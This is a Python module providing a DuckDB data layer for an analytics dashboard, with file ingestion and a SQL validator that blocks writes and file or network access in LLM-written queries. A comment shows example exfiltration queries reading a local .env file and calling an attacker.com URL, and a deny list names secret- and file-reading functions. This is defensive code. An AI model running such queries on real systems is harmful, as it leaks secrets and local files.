"""Data layer backed by DuckDB.

Pure Python — no Streamlit imports.  All reads/aggregations run in DuckDB
with SQL pushdown (WHERE + GROUP BY), so millions of rows never have to be
loaded into pandas.

This module is a **dumb skeleton**: it knows nothing about column roles,
synonyms, table types, or what data to ingest. It only provides:
- Raw DuckDB connection and query execution
- File storage helpers
- Manifest management

**Everything is driven by ``ui_config.json``** (written by the MCP server):
- Table names come from the config, not hardcoded.
- File classification is delegated to the MCP agent.
- SQL queries with column names come from ``core.tools``.
- This module never guesses which column is which or what table type a file is.
"""
from __future__ import annotations

import io
import json
import logging
import os
import time
import uuid
from pathlib import Path
from typing import Any

import duckdb
import pandas as pd
import sqlglot
from sqlglot import exp
from sqlglot.errors import SqlglotError

# --------------------------------------------------------------------------- #
# Paths
# --------------------------------------------------------------------------- #
BASE_DIR = Path(__file__).resolve().parent.parent
UPLOAD_DIR = BASE_DIR / "data_uploaded"
DB_PATH = UPLOAD_DIR / "analytics.duckdb"

# Tables are no longer hardcoded — they come from ui_config.json.
# This module reads them dynamically via _get_tables_from_config().
_MANIFEST = "manifest.json"
_CSV_EXT = ".csv"

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
_LOG_FILE = BASE_DIR / "log_trace_upload_data.log"

_logger = logging.getLogger("upload_data")
_logger.setLevel(logging.DEBUG)
_logger.propagate = False
if not _logger.handlers:
    _fh = logging.FileHandler(_LOG_FILE, mode="a", encoding="utf-8")
    _fh.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)s | %(message)s", "%Y-%m-%d %H:%M:%S"))
    _logger.addHandler(_fh)

# --------------------------------------------------------------------------- #
# Connection — ephemeral connections to avoid cross-process lock conflicts
# --------------------------------------------------------------------------- #
#
# IMPORTANT: DuckDB on Windows blocks the entire file when one process opens it
# for writing. Even read-only connections from another process fail. To support
# the MCP server (writer) and Streamlit UI (reader) running as separate processes,
# we use ephemeral connections that open, execute, and close immediately.
# This ensures the file lock is released between operations, allowing the other
# process to access the database.
#
# The _con singleton is kept only for ingestir_tabla() which needs a persistent
# connection for the duration of a multi-file upload session.


def _open_con(read_only: bool = False) -> duckdb.DuckDBPyConnection:
    """Open a fresh DuckDB connection (ephemeral — caller must close it).

    ``read_only=True`` opens the database in read-only mode, which lets the UI
    share the file with the MCP server and rejects accidental writes
    (DROP/COPY/INSERT) coming from a dashboard query.
    """
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    if read_only and DB_PATH.exists() and _con is None:
        try:
            return duckdb.connect(str(DB_PATH), read_only=True)
        except Exception:
            # Older/edge cases (e.g. file created but empty) — fall back.
            pass
    return duckdb.connect(str(DB_PATH))


_con: duckdb.DuckDBPyConnection | None = None


def get_con() -> duckdb.DuckDBPyConnection:
    """Open (or create) the shared DuckDB database connection.

    Returns a persistent singleton connection. Use this only for operations
    that need a long-lived connection (e.g., multi-step ingestion).
    For simple queries, prefer ejecutar() which uses ephemeral connections.
    """
    global _con
    if _con is None:
        DB_PATH.parent.mkdir(parents=True, exist_ok=True)
        _con = duckdb.connect(str(DB_PATH))
    return _con


def close_con() -> None:
    """Close the persistent singleton connection to release the file lock.

    Call this after ingestion is complete so that other processes (e.g.,
    Streamlit) can access the database. The next call to get_con() will
    create a fresh connection.
    """
    global _con
    if _con is not None:
        try:
            _con.close()
        except Exception:
            pass
        _con = None


# --------------------------------------------------------------------------- #
# SQL allow-list
# --------------------------------------------------------------------------- #
#
# ``ui_config.json`` contains SQL written by the LLM, and anyone with write
# access to that file can put arbitrary SQL in it. A read-only DuckDB connection
# protects against writes, but not against reading files or the network:
#
#     SELECT * FROM read_csv('C:\Users\...\.env')
#     SELECT * FROM read_csv('https://attacker.com/?x=' || ...)
#
# ``safe_sql`` closes that hole: one statement, root must be a read-only query,
# no file/network table functions, and every referenced table must exist in the
# database (or be a CTE alias).
_MAX_SQL_LEN = 50_000

# Statement types that are safe to execute from a dashboard.
_RAICES_PERMITIDAS = tuple(
    getattr(exp, nombre)
    for nombre in ("Select", "Union", "Intersect", "Except", "Subquery",
                   "Describe", "Show", "Values")
    if hasattr(exp, nombre)
)

# Anything that writes, attaches, installs extensions or runs OS commands.
_NODOS_PROHIBIDOS = tuple(
    getattr(exp, nombre)
    for nombre in ("Insert", "Update", "Delete", "Drop", "Create", "Alter",
                   "Attach", "Detach", "Copy", "Pragma", "Install", "Load",
                   "Command", "Use", "Set", "Transaction", "Merge", "Grant",
                   "Export", "Import", "Refresh", "Cache", "Uncache")
    if hasattr(exp, nombre)
)

# Table functions that touch the filesystem or the network.
_FUNCIONES_PROHIBIDAS = {
    "glob", "query", "query_table", "sniff_csv", "getvariable", "getenv",
    "sqlite_attach", "sqlite_scan", "postgres_scan", "mysql_scan",
    "iceberg_scan", "delta_scan", "which_secret", "read_xlsx",
}


def _nombre_funcion(nodo: exp.Func) -> str:
    """Best-effort lowercase name of a function node (Anonymous uses ``name``)."""
    if isinstance(nodo, exp.Anonymous):
        return str(nodo.name or "").lower()
    return str(nodo.sql_name() or "").lower()


def safe_sql(sql: str, tablas: set[str] | None = None) -> str | None:
    """Validate *sql* before running it.

    Returns ``None`` when the query is safe, or a short reason (in Spanish,
    ready to show in the UI) when it is not.

    This is a defence-in-depth check, not a full SQL sandbox: it blocks
    multi-statement SQL, writes/DDL/ATTACH, file & network table functions and
    tables that don't exist in the database. Combined with the read-only
    connection, that covers the realistic attack surface of an editable
    ``ui_config.json``.

    Args:
        sql: Query to validate.
        tablas: Tables allowed in this query. Defaults to the tables present in
            the database; pass an explicit set in tests.
    """
    if not isinstance(sql, str) or not sql.strip():
        return "La consulta está vacía."

    if len(sql) > _MAX_SQL_LEN:
        return "La consulta es demasiado larga."

    try:
        statements = sqlglot.parse(sql, read="duckdb")
    except SqlglotError as exc:
        return f"SQL no válido: {str(exc).splitlines()[0][:160]}"

    statements = [s for s in statements if s is not None]
    if not statements:
        return "La consulta está vacía."
    if len(statements) > 1:
        return "Solo se permite una sentencia SQL por consulta."

    tree = statements[0]

    if not isinstance(tree, _RAICES_PERMITIDAS):
        return f"Solo se permiten consultas de lectura (SELECT). Tipo detectado: {type(tree).__name__}."

    for nodo in tree.walk():
        if isinstance(nodo, _NODOS_PROHIBIDOS):
            return f"Operación no permitida: {type(nodo).__name__.upper()}."

    for nodo in tree.find_all(exp.Func):
        nombre = _nombre_funcion(nodo)
        if nombre.startswith("read_") or nombre.endswith("_scan") or nombre in _FUNCIONES_PROHIBIDAS:
            return f"Función no permitida: {nombre}() (acceso a archivos o red)."

    # Tables must exist in the database (CTE aliases are fine).
    alias_cte = {str(cte.alias).lower() for cte in tree.find_all(exp.CTE)}
    referenciadas: set[str] = set()
    for tabla in tree.find_all(exp.Table):
        if isinstance(tabla.this, exp.Func):
            # Already covered by the function check above.
            continue
        if tabla.catalog:
            return f"Acceso a catálogo no permitido: {tabla.catalog}."
        if tabla.db and str(tabla.db).lower() != "main":
            return f"Acceso a esquema no permitido: {tabla.db}."
        nombre = str(tabla.name or "")
        if nombre and nombre.lower() not in alias_cte:
            referenciadas.add(nombre)

    if referenciadas:
        disponibles = {t.lower() for t in tablas} if tablas is not None else None
        if disponibles is None:
            try:
                disponibles = {t.lower() for t in tablas_disponibles()}
            except Exception:
                disponibles = set()
        if disponibles:
            no_encontradas = referenciadas - disponibles
            if no_encontradas:
                return (
                    "La consulta usa tablas que no existen: "
                    + ", ".join(sorted(no_encontradas))
                    + ". Disponibles: "
                    + ", ".join(sorted(disponibles))
                    + "."
                )

    return None


_ULTIMO_ERROR: str | None = None
_ERROR_SEQ = 0


def error_seq() -> int:
    """Number of failed queries so far (cheap way to detect new failures)."""
    return _ERROR_SEQ


def ejecutar(
    sql: str,
    params: dict[str, Any] | None = None,
) -> pd.DataFrame:
    """Run a DuckDB query using an ephemeral read-only connection.

    Opens a connection, executes the query, and closes the connection
    immediately. This avoids holding a file lock that would block the
    other process (MCP or Streamlit) from accessing the database.

    Failures are logged instead of swallowed silently; ``ultimo_error()``
    exposes the last message so the UI can surface it.

    Args:
        sql: SQL query string.
        params: Optional named parameters.
    """
    global _ULTIMO_ERROR, _ERROR_SEQ

    if not DB_PATH.exists():
        return pd.DataFrame()

    motivo = safe_sql(sql)
    if motivo is not None:
        _ULTIMO_ERROR = f"SQL bloqueado: {motivo}"
        _ERROR_SEQ += 1
        _logger.warning(
            "Query blocked: %s | SQL: %s",
            motivo,
            " ".join(str(sql).split())[:300],
        )
        return pd.DataFrame()

    con = _open_con(read_only=True)
    try:
        df = con.execute(sql, params or {}).df()
        return df
    except Exception as exc:
        _ULTIMO_ERROR = f"{type(exc).__name__}: {exc}"
        _ERROR_SEQ += 1
        _logger.error(
            "Query failed: %s | SQL: %s",
            exc,
            " ".join(str(sql).split())[:300],
        )
        return pd.DataFrame()
    finally:
        try:
            con.close()
        except Exception:
            pass


def ultimo_error() -> str | None:
    """Last SQL error captured by :func:`ejecutar` (kept until the next failure)."""
    return _ULTIMO_ERROR

# --------------------------------------------------------------------------- #
# Storage helpers
# --------------------------------------------------------------------------- #
def _manifest() -> dict:
    mf = UPLOAD_DIR / _MANIFEST
    if not mf.exists():
        return {}
    try:
        datos = json.loads(mf.read_text(encoding="utf-8"))
    except Exception:
        return {}
    norm: dict = {}
    for k, v in datos.items():
        if isinstance(v, str):
            norm[k] = {"nombre": v, "hash": ""}
        else:
            norm[k] = v if isinstance(v, dict) else {"nombre": str(v), "hash": ""}
    return norm


def _guardar_manifest(nombres: dict) -> None:
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    (UPLOAD_DIR / _MANIFEST).write_text(json.dumps(nombres, indent=2), encoding="utf-8")


def _existe_tabla(con: duckdb.DuckDBPyConnection, tabla: str) -> bool:
    try:
        con.execute(f"SELECT 1 FROM {tabla} LIMIT 1").fetchall()
        return True
    except Exception:
        return False


def tabla_existe(tabla: str) -> bool:
    """Check if a table exists in the DuckDB database using an ephemeral connection."""
    if not DB_PATH.exists():
        return False
    con = _open_con(read_only=True)
    try:
        return _existe_tabla(con, tabla)
    except Exception:
        return False
    finally:
        try:
            con.close()
        except Exception:
            pass


def tablas_disponibles() -> list[str]:
    """Return a list of all table names in the DuckDB database using an ephemeral connection."""
    if not DB_PATH.exists():
        return []
    con = _open_con(read_only=True)
    try:
        df = con.execute("SHOW TABLES").df()
        if df.empty:
            return []
        return [str(r) for r in df.iloc[:, 0]]
    except Exception:
        return []
    finally:
        try:
            con.close()
        except Exception:
            pass


def hay_datos() -> bool:
    """Check if any data has been loaded into the database."""
    return len(tablas_disponibles()) > 0


def archivo_en_uso(tipo: str) -> str:
    """Return the filename currently loaded for a given table type key."""
    info = _manifest().get(tipo)
    if isinstance(info, str):
        return info
    return (info or {}).get("nombre", f"{tipo}.csv")


# --------------------------------------------------------------------------- #
# Upload / ingest — generic, no hardcoded types
# --------------------------------------------------------------------------- #
def ingestir_tabla(tabla: str, files) -> list[str]:
    """Ingest uploaded files into a DuckDB table whose name is provided by the caller.
    
    This is the generic ingestion function. The MCP agent (or any caller) decides
    what table name to use. This module just stores the data.
    
    Args:
        tabla: Target table name in DuckDB (e.g. "sales", "my_data", etc.).
        files: List of file-like objects (CSV or Excel).
    
    Returns:
        List of status messages for each file processed.
    """
    con = get_con()
    mensajes = []
    nombres = _manifest()
    
    for f in (files or []):
        nombre = _nombre_archivo(f)
        try:
            raw = _leer_cabecera(f)
        except Exception as e:
            msg = f"Error reading '{nombre}': {e}"
            _logger.warning(msg)
            mensajes.append(msg)
            continue
        
        fhash = _hash_archivo(f)
        previo = nombres.get(tabla)
        prev_hash = (previo or {}).get("hash", "") if isinstance(previo, dict) else ""
        if prev_hash and prev_hash == fhash:
            msg = f"'{nombre}' already loaded (skipped)"
            _logger.info(msg)
            mensajes.append(msg)
            continue
        
        es_xlsx = _es_excel(f)
        sufijo = ".parquet" if es_xlsx else _CSV_EXT
        ruta_disco = UPLOAD_DIR / f"__ingest_{tabla}_{uuid.uuid4().hex[:12]}{sufijo}"
        try:
            if es_xlsx:
                df = pd.read_excel(io.BytesIO(f.getvalue()), engine="calamine")
                df = _normalizar_fechas(df)
                con.register("__tmp_upload", df)
                try:
                    _crear_tabla(con, tabla, "__tmp_upload")
                finally:
                    try:
                        con.unregister("__tmp_upload")
                    except Exception:
                        pass
            else:
                _volcar_a_csv(f, ruta_disco)
                _crear_tabla(con, tabla, _sani(ruta_disco))
            nombres[tabla] = {"nombre": nombre, "hash": fhash}
            msg = f"'{nombre}' ingested into table '{tabla}' ({len(raw)} rows)"
            _logger.info(msg)
            mensajes.append(msg)
        except Exception as e:
            msg = f"Error ingesting '{nombre}' into '{tabla}': {e}"
            _logger.error(msg)
            mensajes.append(msg)
        finally:
            if ruta_disco.exists():
                try:
                    ruta_disco.unlink()
                except Exception:
                    pass
    
    if nombres:
        _guardar_manifest(nombres)
    # Release the DuckDB file lock: the UI only reads, and the MCP server needs
    # to write. Keeping the writer open here caused "file is being used by
    # another process" on Windows.
    close_con()
    return mensajes


def _crear_tabla(con: duckdb.DuckDBPyConnection, tabla: str, fuente_sql: str) -> None:
    """Create or replace a table from a SQL source expression."""
    sql = f"CREATE OR REPLACE TABLE {tabla} AS SELECT * FROM {fuente_sql}"
    con.execute(sql)
    con.commit()
    # Force checkpoint so other processes (e.g., Streamlit read-only) can see the data.
    try:
        con.execute("CHECKPOINT")
    except Exception:
        pass
    _logger.info("Table '%s' created from %s", tabla, fuente_sql[:80])


def guardar_archivos(files, tabla: str = "default") -> list[str]:
    """Legacy alias for ingestir_tabla. Kept for backward compatibility.
    
    Args:
        files: List of file-like objects.
        tabla: Target table name (default: "default").
    
    Returns:
        List of status messages.
    """
    return ingestir_tabla(tabla, files)


# --------------------------------------------------------------------------- #
# Private helpers
# --------------------------------------------------------------------------- #
def _nombre_archivo(f) -> str:
    return getattr(f, "name", None) or "dataset.csv"


def _extension(f) -> str:
    nombre = _nombre_archivo(f).lower()
    return nombre.rsplit(".", 1)[-1] if "." in nombre else ""


def _es_excel(f) -> bool:
    return _extension(f) in {"xlsx", "xls"}


def _leer_cabecera(f, nrows: int = 200) -> pd.DataFrame:
    buf = io.BytesIO(f.getvalue())
    if _es_excel(f):
        return pd.read_excel(buf, nrows=nrows, engine="openpyxl")
    return pd.read_csv(buf, nrows=nrows)


def _volcar_a_csv(f, ruta) -> None:
    with open(ruta, "wb") as fh:
        fh.write(f.getvalue())


def _hash_archivo(f) -> str:
    import hashlib
    try:
        return hashlib.sha256(f.getvalue()).hexdigest()[:16]
    except Exception:
        return ""


_ALIASES_FECHA = ("date", "fecha", "dia", "timestamp", "datetime", "nacimiento", "birth")


def _normalizar_fechas(df: pd.DataFrame) -> pd.DataFrame:
    for c in df.columns:
        base = str(c).lower()
        if not any(a in base for a in _ALIASES_FECHA):
            continue
        if df[c].dtype == object or pd.api.types.is_string_dtype(df[c]):
            try:
                df[c] = pd.to_datetime(df[c], errors="coerce")
            except Exception:
                pass
    return df


def _sani(ruta) -> str:
    """Sanitize a file path for use in DuckDB SQL — wraps in quotes so spaces work."""
    path_str = str(ruta).replace("\\", "/")
    return f"'{path_str}'"


def limpiar_datos() -> None:
    global _con
    try:
        if _con is not None:
            _con.close()
    except Exception:
        pass
    _con = None
    if DB_PATH.exists():
        try:
            DB_PATH.unlink()
        except Exception:
            pass
    if UPLOAD_DIR.exists():
        for f in UPLOAD_DIR.iterdir():
            if f.is_file() and f.name != _MANIFEST:
                try:
                    f.unlink()
                except Exception:
                    pass
        _guardar_manifest({})
